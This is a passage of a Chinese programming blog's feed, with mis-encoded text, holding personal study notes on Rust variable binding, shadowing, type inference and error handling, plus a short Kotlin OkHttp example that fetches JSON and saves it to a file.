        <content type="html"><![CDATA[<h1 id="Rustç¬”è®°å…¶ä¸€"><a href="#Rustç¬”è®°å…¶ä¸€" class="headerlink" title="Rustç¬”è®°å…¶ä¸€"></a>Rustç¬”è®°å…¶ä¸€</h1><h2 id="å˜é‡ç»‘å®š"><a href="#å˜é‡ç»‘å®š" class="headerlink" title="å˜é‡ç»‘å®š"></a>å˜é‡ç»‘å®š</h2><blockquote><p>åœ¨å…¶å®ƒè¯­è¨€ä¸­ï¼Œæˆ‘ä»¬ç”¨ <code>var a = "hello world"</code> çš„æ–¹å¼ç»™ <code>a</code> èµ‹å€¼ï¼Œä¹Ÿå°±æ˜¯æŠŠç­‰å¼å³è¾¹çš„ <code>"hello world"</code> å­—ç¬¦ä¸²èµ‹å€¼ç»™å˜é‡ <code>a</code> ï¼Œè€Œåœ¨ Rust ä¸­ï¼Œæˆ‘ä»¬è¿™æ ·å†™ï¼š <code>let a = "hello world"</code> ï¼ŒåŒæ—¶ç»™è¿™ä¸ªè¿‡ç¨‹èµ·äº†å¦ä¸€ä¸ªåå­—ï¼š<strong>å˜é‡ç»‘å®š</strong>ã€‚</p><p>ä¸ºä½•ä¸ç”¨èµ‹å€¼è€Œç”¨ç»‘å®šå‘¢ï¼ˆå…¶å®ä½ ä¹Ÿå¯ä»¥ç§°ä¹‹ä¸ºèµ‹å€¼ï¼Œä½†æ˜¯ç»‘å®šçš„å«ä¹‰æ›´æ¸…æ™°å‡†ç¡®ï¼‰ï¼Ÿè¿™é‡Œå°±æ¶‰åŠ Rust æœ€æ ¸å¿ƒçš„åŸåˆ™â€”â€”<strong>æ‰€æœ‰æƒ</strong>ï¼Œç®€å•æ¥è®²ï¼Œä»»ä½•å†…å­˜å¯¹è±¡éƒ½æ˜¯æœ‰ä¸»äººçš„ï¼Œè€Œä¸”ä¸€èˆ¬æƒ…å†µä¸‹å®Œå…¨å±äºå®ƒçš„ä¸»äººï¼Œç»‘å®šå°±æ˜¯æŠŠè¿™ä¸ªå¯¹è±¡ç»‘å®šç»™ä¸€ä¸ªå˜é‡ï¼Œè®©è¿™ä¸ªå˜é‡æˆä¸ºå®ƒçš„ä¸»äººï¼ˆèªæ˜çš„è¯»è€…åº”è¯¥èƒ½çŒœåˆ°ï¼Œåœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œè¯¥å¯¹è±¡ä¹‹å‰çš„ä¸»äººå°±ä¼šä¸§å¤±å¯¹è¯¥å¯¹è±¡çš„æ‰€æœ‰æƒï¼‰ï¼Œåƒæäº†æˆ‘ä»¬çš„ç°å®ä¸–ç•Œï¼Œä¸æ˜¯å—ï¼Ÿ</p><p>æ‘˜è‡ª ã€ŠRust Courseã€‹</p></blockquote><h2 id="è§£æ„è¯­æ³•"><a href="#è§£æ„è¯­æ³•" class="headerlink" title="è§£æ„è¯­æ³•"></a>è§£æ„è¯­æ³•</h2><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token keyword">struct</span> <span class="token type-definition class-name">Struct</span> <span class="token punctuation">{</span>    e<span class="token punctuation">:</span> <span class="token keyword">i32</span><span class="token punctuation">}</span><span class="token keyword">fn</span> <span class="token function-definition function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">let</span> <span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">)</span><span class="token punctuation">;</span>    a <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    b <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>    <span class="token comment">// æ•°ç»„è§£æ„</span>    <span class="token keyword">let</span> <span class="token punctuation">[</span>c<span class="token punctuation">,</span><span class="token punctuation">..</span><span class="token punctuation">,</span>d<span class="token punctuation">,</span>_<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token comment">// ç»“æ„ä½“è§£æ„</span>    <span class="token keyword">let</span> <span class="token class-name">Struct</span> <span class="token punctuation">{</span> e<span class="token punctuation">,</span> <span class="token punctuation">..</span> <span class="token punctuation">}</span> <span class="token operator">=</span> <span class="token class-name">Struct</span> <span class="token punctuation">{</span> e<span class="token punctuation">:</span> <span class="token number">5</span> <span class="token punctuation">}</span><span class="token punctuation">;</span>    <span class="token macro property">assert_eq!</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>a<span class="token punctuation">,</span> b<span class="token punctuation">,</span> c<span class="token punctuation">,</span> d<span class="token punctuation">,</span> e<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="å˜é‡é®è”½-shadowing"><a href="#å˜é‡é®è”½-shadowing" class="headerlink" title="å˜é‡é®è”½(shadowing)"></a>å˜é‡é®è”½(shadowing)</h2><p>Rust å…è®¸å£°æ˜ç›¸åŒçš„å˜é‡åï¼Œåœ¨åé¢å£°æ˜çš„å˜é‡ä¼šé®è”½æ‰å‰é¢å£°æ˜çš„ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š</p><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token keyword">fn</span> <span class="token function-definition function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">let</span> x <span class="token operator">=</span> <span class="token number">5</span><span class="token punctuation">;</span>    <span class="token comment">// åœ¨mainå‡½æ•°çš„ä½œç”¨åŸŸå†…å¯¹ä¹‹å‰çš„xè¿›è¡Œé®è”½</span>    <span class="token keyword">let</span> x <span class="token operator">=</span> x <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token punctuation">{</span>        <span class="token comment">// åœ¨å½“å‰çš„èŠ±æ‹¬å·ä½œç”¨åŸŸå†…ï¼Œå¯¹ä¹‹å‰çš„xè¿›è¡Œé®è”½</span>        <span class="token keyword">let</span> x <span class="token operator">=</span> x <span class="token operator">*</span> <span class="token number">2</span><span class="token punctuation">;</span>        <span class="token macro property">println!</span><span class="token punctuation">(</span><span class="token string">"The value of x in the inner scope is: {}"</span><span class="token punctuation">,</span> x<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token macro property">println!</span><span class="token punctuation">(</span><span class="token string">"The value of x is: {}"</span><span class="token punctuation">,</span> x<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="ç±»å‹æ¨å¯¼"><a href="#ç±»å‹æ¨å¯¼" class="headerlink" title="ç±»å‹æ¨å¯¼"></a>ç±»å‹æ¨å¯¼</h2><p>ä¸ªäººæ„Ÿè§‰æ¯”è¾ƒç±»ä¼¼ktçš„ç±»å‹æ¨å¯¼å§ï¼Œè¦ä¹ˆå£°æ˜å˜é‡ç±»å‹ï¼Œè¦ä¹ˆæŒ‡å®šæ³›å‹</p><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token keyword">let</span> guess <span class="token operator">=</span> <span class="token string">"42"</span><span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">except</span><span class="token punctuation">(</span><span class="token string">"Not a number"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// æŠ¥é”™ï¼Œæ— æ³•æ¨æ–­ä½ æƒ³è¦parseçš„ç±»å‹</span><span class="token keyword">let</span> guess<span class="token punctuation">:</span> <span class="token keyword">i32</span> <span class="token operator">=</span> <span class="token string">"42"</span><span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">except</span><span class="token punctuation">(</span><span class="token string">"Not a number"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// âˆš</span><span class="token keyword">let</span> guess <span class="token operator">=</span> <span class="token string">"42"</span><span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">::</span><span class="token operator">&lt;</span><span class="token keyword">i32</span><span class="token operator">&gt;</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">expect</span><span class="token punctuation">(</span><span class="token string">"Not a number!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// âˆš</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>rustçš„æ³›å‹è¿˜è¦æ‰“::ï¼ŒæŒºæ€ªï¼Œä½†èƒ½æ¥å—ã€‚</p><h2 id="å¼‚å¸¸å¤„ç†"><a href="#å¼‚å¸¸å¤„ç†" class="headerlink" title="å¼‚å¸¸å¤„ç†"></a>å¼‚å¸¸å¤„ç†</h2><blockquote><h2 id="Rust-çš„é”™è¯¯å“²å­¦"><a href="#Rust-çš„é”™è¯¯å“²å­¦" class="headerlink" title="Rust çš„é”™è¯¯å“²å­¦"></a>Rust çš„é”™è¯¯å“²å­¦</h2><p>é”™è¯¯å¯¹äºè½¯ä»¶æ¥è¯´æ˜¯ä¸å¯é¿å…çš„ï¼Œå› æ­¤ä¸€é—¨ä¼˜ç§€çš„ç¼–ç¨‹è¯­è¨€å¿…é¡»æœ‰å…¶å®Œæ•´çš„é”™è¯¯å¤„ç†å“²å­¦ã€‚åœ¨å¾ˆå¤šæƒ…å†µä¸‹ï¼ŒRust éœ€è¦ä½ æ‰¿è®¤è‡ªå·±çš„ä»£ç å¯èƒ½ä¼šå‡ºé”™ï¼Œå¹¶æå‰é‡‡å–è¡ŒåŠ¨ï¼Œæ¥å¤„ç†è¿™äº›é”™è¯¯ã€‚</p><p>Rust ä¸­çš„é”™è¯¯ä¸»è¦åˆ†ä¸ºä¸¤ç±»ï¼š</p><ul><li><strong>å¯æ¢å¤é”™è¯¯</strong>ï¼Œé€šå¸¸ç”¨äºä»ç³»ç»Ÿå…¨å±€è§’åº¦æ¥çœ‹å¯ä»¥æ¥å—çš„é”™è¯¯ï¼Œä¾‹å¦‚å¤„ç†ç”¨æˆ·çš„è®¿é—®ã€æ“ä½œç­‰é”™è¯¯ï¼Œè¿™äº›é”™è¯¯åªä¼šå½±å“æŸä¸ªç”¨æˆ·è‡ªèº«çš„æ“ä½œè¿›ç¨‹ï¼Œè€Œä¸ä¼šå¯¹ç³»ç»Ÿçš„å…¨å±€ç¨³å®šæ€§äº§ç”Ÿå½±å“</li><li><strong>ä¸å¯æ¢å¤é”™è¯¯</strong>ï¼Œåˆšå¥½ç›¸åï¼Œè¯¥é”™è¯¯é€šå¸¸æ˜¯å…¨å±€æ€§æˆ–è€…ç³»ç»Ÿæ€§çš„é”™è¯¯ï¼Œä¾‹å¦‚æ•°ç»„è¶Šç•Œè®¿é—®ï¼Œç³»ç»Ÿå¯åŠ¨æ—¶å‘ç”Ÿäº†å½±å“å¯åŠ¨æµç¨‹çš„é”™è¯¯ç­‰ç­‰ï¼Œè¿™äº›é”™è¯¯çš„å½±å“å¾€å¾€å¯¹äºç³»ç»Ÿæ¥è¯´æ˜¯è‡´å‘½çš„</li></ul><p>å¾ˆå¤šç¼–ç¨‹è¯­è¨€ï¼Œå¹¶ä¸ä¼šåŒºåˆ†è¿™äº›é”™è¯¯ï¼Œè€Œæ˜¯ç›´æ¥é‡‡ç”¨å¼‚å¸¸çš„æ–¹å¼å»å¤„ç†ã€‚Rust æ²¡æœ‰å¼‚å¸¸ï¼Œä½†æ˜¯ Rust ä¹Ÿæœ‰è‡ªå·±çš„å§é¾™å‡¤é›ï¼š<code>Result&lt;T, E&gt;</code> ç”¨äºå¯æ¢å¤é”™è¯¯ï¼Œ<code>panic!</code> ç”¨äºä¸å¯æ¢å¤é”™è¯¯ã€‚</p><p>æ‘˜è‡ª ã€ŠRust Crouseã€‹</p></blockquote><p>æˆ‘ä»¬å¯ä»¥ç›´æ¥ä½¿ç”¨<code>panic!</code>æ¥æŠ›å‡ºä¸€ä¸ªå¼‚å¸¸ï¼Œè®©ç¨‹åºç›´æ¥å´©æºƒï¼Œä½†ä¸€èˆ¬æˆ‘ä»¬ä¸ä¼šè¿™ä¹ˆåšã€‚ä¸€èˆ¬æˆ‘ä»¬ä¼šå¤§é‡çš„ä½¿ç”¨<code>Result</code>æ¥è¿›è¡Œå¼‚å¸¸çš„ä¼ é€’ï¼Œæ¯•ç«ŸRusté‡Œæ˜¯æ²¡æœ‰try catchçš„ï¼Œè€Œæˆ‘ä»¬æŠ›å‡ºå¼‚å¸¸çš„ç›®çš„ä¸€èˆ¬ä¸ä¼šæ˜¯ç›´æ¥è®©æ•´ä¸ªç¨‹åºå´©æºƒï¼Œè€Œæ˜¯è¦è®©å…¶ä»–äººå»å¤„ç†è¿™ä¸ªå¼‚å¸¸ã€‚</p><p>è®²çœŸï¼Œæˆ‘è§‰å¾—rustçš„å¼‚å¸¸å¤„ç†è®¾è®¡å¾—ç®€ç›´ä¸€çº§æ£’ï¼Œæ¯”goå’Œjavaçš„ä¸çŸ¥é“é«˜åˆ°å“ªé‡Œå»äº†ï¼Œkotlinçš„Result APIä¹Ÿä¸è¿‡æ˜¯æ˜¯å¯¹å…¶æ‹™åŠ£çš„æ¨¡ä»¿ï¼ˆæš´è®ºï¼‰~</p><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token comment">// expect å¦‚äº§ç”Ÿé”™è¯¯ ç›´æ¥panic!</span><span class="token keyword">let</span> guess <span class="token operator">=</span> <span class="token string">"42"</span><span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">::</span><span class="token operator">&lt;</span><span class="token keyword">i32</span><span class="token operator">&gt;</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">expect</span><span class="token punctuation">(</span><span class="token string">"Not a number!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// æ¯”è¾ƒç±»ä¼¼goçš„å¼‚å¸¸å¤„ç†æ–¹å¼ï¼Œä¸è¿‡è¯­æ³•æ›´åŠ å¥½çœ‹</span><span class="token comment">// ä¸è¿‡è¿™ç§æ–¹å¼å†™å¤šäº†ä¼šé€ æˆå¤šå±‚åµŒå¥—</span><span class="token keyword">let</span> guess <span class="token operator">=</span> <span class="token string">"42"</span><span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">::</span><span class="token operator">&lt;</span><span class="token keyword">i32</span><span class="token operator">&gt;</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">match</span> guess <span class="token punctuation">{</span>    <span class="token class-name">Ok</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token macro property">println!</span><span class="token punctuation">(</span><span class="token string">"You guessed: {}"</span><span class="token punctuation">,</span> num<span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token class-name">Err</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token macro property">println!</span><span class="token punctuation">(</span><span class="token string">"Error: {}"</span><span class="token punctuation">,</span> err<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>åŒæ—¶ï¼Œä¸ºäº†é¿å…æ¨¡æ¿ä»£ç ï¼Œrustæœ‰ä¸€ä¸ª<code>?</code>çš„è¯­æ³•ç³–ï¼Œå¯ä»¥åœ¨è¿”å›å€¼ä¸ºResultçš„å‡½æ•°ä¸­ä½¿ç”¨</p><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token keyword">use</span> <span class="token namespace">core<span class="token punctuation">::</span></span>time<span class="token punctuation">;</span><span class="token keyword">use</span> <span class="token namespace">std<span class="token punctuation">::</span></span><span class="token punctuation">{</span><span class="token namespace">fs<span class="token punctuation">::</span></span><span class="token class-name">OpenOptions</span><span class="token punctuation">,</span> thread<span class="token punctuation">,</span> <span class="token namespace">io<span class="token punctuation">::</span></span><span class="token class-name">Write</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">fn</span> <span class="token function-definition function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">-&gt;</span> <span class="token namespace">std<span class="token punctuation">::</span>io<span class="token punctuation">::</span></span><span class="token class-name">Result</span><span class="token operator">&lt;</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">&gt;</span> <span class="token punctuation">{</span>    <span class="token keyword">let</span> <span class="token keyword">mut</span> f <span class="token operator">=</span> <span class="token class-name">OpenOptions</span><span class="token punctuation">::</span><span class="token function">new</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"hello.txt"</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token punctuation">;</span> <span class="token comment">// &lt;-</span>    <span class="token macro property">print!</span><span class="token punctuation">(</span><span class="token string">"{:?} \n"</span><span class="token punctuation">,</span> f<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// on the moment, manually remove the file hello.txt</span>    <span class="token keyword">let</span> ten_millis <span class="token operator">=</span> <span class="token namespace">time<span class="token punctuation">::</span></span><span class="token class-name">Duration</span><span class="token punctuation">::</span><span class="token function">from_millis</span><span class="token punctuation">(</span><span class="token number">10000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token namespace">thread<span class="token punctuation">::</span></span><span class="token function">sleep</span><span class="token punctuation">(</span>ten_millis<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token macro property">print!</span><span class="token punctuation">(</span><span class="token string">"{:?} \n"</span><span class="token punctuation">,</span> f<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">let</span> r <span class="token operator">=</span> f<span class="token punctuation">.</span><span class="token function">write_all</span><span class="token punctuation">(</span><span class="token string">b"Hello, world!"</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token punctuation">;</span>    <span class="token macro property">print!</span><span class="token punctuation">(</span><span class="token string">"Result is {:?} \n"</span><span class="token punctuation">,</span> r<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">drop</span><span class="token punctuation">(</span>f<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">Ok</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è¿™ä¸ª<code>?</code>å¯¹åº”çš„æ¨¡æ¿ä»£ç å¦‚ä¸‹</p><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token keyword">let</span> f <span class="token operator">=</span> <span class="token class-name">OpenOptions</span><span class="token punctuation">::</span><span class="token function">new</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"hello.txt"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">let</span> <span class="token keyword">mut</span> f <span class="token operator">=</span> <span class="token keyword">match</span> f<span class="token punctuation">{</span>    <span class="token class-name">Ok</span><span class="token punctuation">(</span>file<span class="token punctuation">)</span> <span class="token operator">=&gt;</span> file<span class="token punctuation">,</span>    <span class="token class-name">Err</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token keyword">return</span> <span class="token class-name">Err</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å¦‚æ­¤ä¾¿å¤§å¹…ç®€åŒ–äº†å¼€å‘æµç¨‹ï¼Œå®å±å‰å®³</p><p>é‚£ä¹ˆï¼Œrustæœ‰æ²¡æœ‰åŠæ³•æ•è·å¼‚å¸¸å‘¢</p><p>æœ‰</p><blockquote><p>æœ€åï¼Œå†æ¥è¯´ä¸ªä¾‹å¤–ï¼Œ<code>panic::catch_unwind</code>ã€‚</p><p>å…ˆçœ‹ä¸‹å®ƒçš„ç”¨æ³•ï¼š</p><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token keyword">use</span> <span class="token namespace">std<span class="token punctuation">::</span></span>panic<span class="token punctuation">;</span><span class="token keyword">let</span> result <span class="token operator">=</span> <span class="token namespace">panic<span class="token punctuation">::</span></span><span class="token function">catch_unwind</span><span class="token punctuation">(</span><span class="token closure-params"><span class="token closure-punctuation punctuation">|</span><span class="token closure-punctuation punctuation">|</span></span> <span class="token punctuation">{</span>    <span class="token macro property">println!</span><span class="token punctuation">(</span><span class="token string">"hello!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token macro property">assert!</span><span class="token punctuation">(</span>result<span class="token punctuation">.</span><span class="token function">is_ok</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">let</span> result <span class="token operator">=</span> <span class="token namespace">panic<span class="token punctuation">::</span></span><span class="token function">catch_unwind</span><span class="token punctuation">(</span><span class="token closure-params"><span class="token closure-punctuation punctuation">|</span><span class="token closure-punctuation punctuation">|</span></span> <span class="token punctuation">{</span>    <span class="token macro property">panic!</span><span class="token punctuation">(</span><span class="token string">"oh no!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token macro property">assert!</span><span class="token punctuation">(</span>result<span class="token punctuation">.</span><span class="token function">is_err</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ²¡é”™ï¼Œå®ƒçš„è¡Œä¸ºå‡ ä¹å°±æ˜¯try/catchäº†ï¼španicï¼å®è¢«æ•è·äº†ï¼Œç¨‹åºå¹¶ä¹Ÿæ²¡æœ‰æŒ‚ï¼Œè¿”å›äº†Errã€‚å°½ç®¡å¦‚æ­¤ï¼ŒRustçš„ç›®çš„å¹¶ä¸æ˜¯è®©å®ƒæˆä¸ºtry/catchæœºåˆ¶çš„å®ç°ï¼Œè€Œæ˜¯å½“Rustå’Œå…¶ä»–ç¼–ç¨‹è¯­è¨€äº’åŠ¨æ—¶ï¼Œé¿å…å…¶ä»–è¯­è¨€ä»£ç å—throwå‡ºå¼‚å¸¸ã€‚æ‰€ä»¥å‘¢ï¼Œé”™è¯¯å¤„ç†çš„æ­£é“è¿˜æ˜¯ç”¨<strong>Result</strong>ã€‚</p><p>ä»catch_unwindçš„åå­—ä¸Šï¼Œéœ€è¦ç•™æ„ä¸‹unwindè¿™ä¸ªé™å®šè¯ï¼Œå®ƒæ„å‘³ç€åªæœ‰é»˜è®¤è¿›è¡Œæ ˆåè§£çš„panicå¯ä»¥è¢«æ•è·åˆ°ï¼Œå¦‚æœæ˜¯è®¾ä¸ºç›´æ¥ç»ˆæ­¢ç¨‹åºçš„panicï¼Œå°±é€®ä¸ä½äº†ã€‚</p><p>ç»†èŠ‚å¯è¿›ä¸€æ­¥å‚è€ƒ<a href="https://link.zhihu.com/?target=https://doc.rust-lang.org/beta/std/panic/fn.catch_unwind.html">Rust Documentation</a>ã€‚</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> ç¬”è®° </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Rust </tag>
            
            <tag> Rustå­¦ä¹ ç¬”è®° </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ç”¨OkHttpè¿›è¡Œä¸€ä¸ªjsonä¿¡æ¯çš„è·å–</title>
      <link href="/2022/09/03/okhttp-get-json/"/>
      <url>/2022/09/03/okhttp-get-json/</url>
      
        <content type="html"><![CDATA[<h1 id="ç”¨OkHttpè¿›è¡Œä¸€ä¸ªjsonä¿¡æ¯çš„è·å–"><a href="#ç”¨OkHttpè¿›è¡Œä¸€ä¸ªjsonä¿¡æ¯çš„è·å–" class="headerlink" title="ç”¨OkHttpè¿›è¡Œä¸€ä¸ªjsonä¿¡æ¯çš„è·å–"></a>ç”¨OkHttpè¿›è¡Œä¸€ä¸ªjsonä¿¡æ¯çš„è·å–</h1><p>è·å–ä¸€æ®µjsonä¿¡æ¯ï¼Œç”¨gsonå°†å®ƒæ ¼å¼åŒ–ï¼Œå†è¾“å‡ºåˆ°ä¸€ä¸ªæœ¬åœ°jsonæ–‡ä»¶é‡Œ</p><pre class="line-numbers language-kotlin" data-language="kotlin"><code class="language-kotlin"><span class="token comment">/** * ä»è¯·æ±‚ä¸­è·å–jsonå­—ç¬¦ä¸²ï¼Œå°†å…¶æ ¼å¼åŒ–è¾“å‡ºåˆ°æ–‡ä»¶ä¸­ * ä½¿ç”¨Gsonæ ¼å¼åŒ–jsonå­—ç¬¦ä¸² */</span><span class="token keyword">fun</span> <span class="token function">getData</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">val</span> gson <span class="token operator">=</span> <span class="token function">GsonBuilder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">setPrettyPrinting</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">create</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">val</span> client <span class="token operator">=</span> <span class="token function">OkHttpClient</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">val</span> request <span class="token operator">=</span> Request<span class="token punctuation">.</span><span class="token function">Builder</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">.</span><span class="token function">url</span><span class="token punctuation">(</span><span class="token string">"https://www.wanandroid.com/article/list/0/json"</span><span class="token punctuation">)</span>        <span class="token punctuation">.</span><span class="token function">build</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">val</span> response <span class="token operator">=</span> client<span class="token punctuation">.</span><span class="token function">newCall</span><span class="token punctuation">(</span>request<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">val</span> json <span class="token operator">=</span> response<span class="token punctuation">.</span>body<span class="token operator">?</span><span class="token punctuation">.</span><span class="token function">string</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>json <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">val</span> formatted <span class="token operator">=</span> gson<span class="token punctuation">.</span><span class="token function">toJson</span><span class="token punctuation">(</span>gson<span class="token punctuation">.</span><span class="token function">fromJson</span><span class="token punctuation">(</span>json<span class="token punctuation">,</span> Any<span class="token operator">::</span><span class="token keyword">class</span><span class="token punctuation">.</span>java<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">val</span> file <span class="token operator">=</span> <span class="token function">File</span><span class="token punctuation">(</span><span class="token string">"E:\\data.json"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">apply</span> <span class="token punctuation">{</span> <span class="token function">createNewFile</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">}</span>        <span class="token function">FileWriter</span><span class="token punctuation">(</span>file<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">apply</span> <span class="token punctuation">{</span>            <span class="token function">write</span><span class="token punctuation">(</span>formatted<span class="token punctuation">)</span>            <span class="token function">flush</span><span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> ç¬”è®° </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å¤–éƒ¨åº“ </tag>
            
            <tag> ç½‘ç»œæ“ä½œ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>OKHttp/HttpURLConnectionä½¿ç”¨ç¬”è®°</title>
